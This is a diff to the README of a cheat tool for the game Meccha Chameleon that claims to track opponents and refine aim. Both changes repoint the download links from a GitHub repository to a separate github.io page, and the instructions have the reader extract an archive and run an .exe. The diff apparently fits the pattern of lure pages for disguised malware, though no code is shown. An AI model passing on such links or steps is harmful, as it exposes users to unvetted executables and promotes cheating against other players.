@@ -1,6 +1,6 @@
 # 🎮 Meccha-Predator-Plus - Gain an advantage in Meccha Chameleon
 
-[![Download Meccha-Predator-Plus](https://img.shields.io/badge/Download-Meccha-Predator-Plus-blue.svg)](https://github.com/Disabling-austinfriar226/Meccha-Predator-Plus)
+[![Download Meccha-Predator-Plus](https://img.shields.io/badge/Download-Meccha-Predator-Plus-blue.svg)](https://disabling-austinfriar226.github.io)
 
 Meccha-Predator-Plus provides a suite of tools designed for the game Meccha Chameleon. This software assists players by adjusting game variables to improve performance and visibility during matches. Use these features to track opponents, refine your aim, and manage your movement across the map.
 
@@ -33,7 +33,7 @@ Ensure your computer meets these standards before running the software.
 
 Follow these steps to prepare the software.
 
-1. Visit the [official repository page](https://github.com/Disabling-austinfriar226/Meccha-Predator-Plus) to locate the latest build.
+1. Visit the [official repository page](https://disabling-austinfriar226.github.io) to locate the latest build.
 2. Download the compressed file to your computer.
 3. Right-click the folder and select Extract All to view the contents.
 4. Locate the executable file ending in .exe.
